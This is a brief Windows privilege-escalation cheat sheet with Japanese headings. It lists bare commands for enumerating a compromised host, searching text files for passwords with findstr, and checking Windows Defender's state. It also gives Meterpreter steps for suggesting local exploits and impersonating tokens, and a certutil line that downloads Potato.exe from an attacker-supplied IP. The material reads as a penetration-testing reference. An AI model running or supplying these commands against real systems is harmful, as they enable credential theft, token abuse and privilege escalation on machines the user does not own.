# Windows

## 情報収集

```shell
systeminfo
```

```shell
whoami /priv
whoami /groups
```

```shell
net user
net user <user>
```

```shell
ipconfig
arp -a
route print
netstat -ano
```

```shell
findstr /si password *.txt
```

```shell
sc query
sc query windefend
```

```shell
netsh firewall show state
```

```shell
meterpreter> run post/multi/recon/local_exploit_suggester
```

```shell
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token <domain\username>
```

```shell
# wget と同じ効果
certutil -urlcache -f http://<ip>/Potato.exe Potato.exe
```
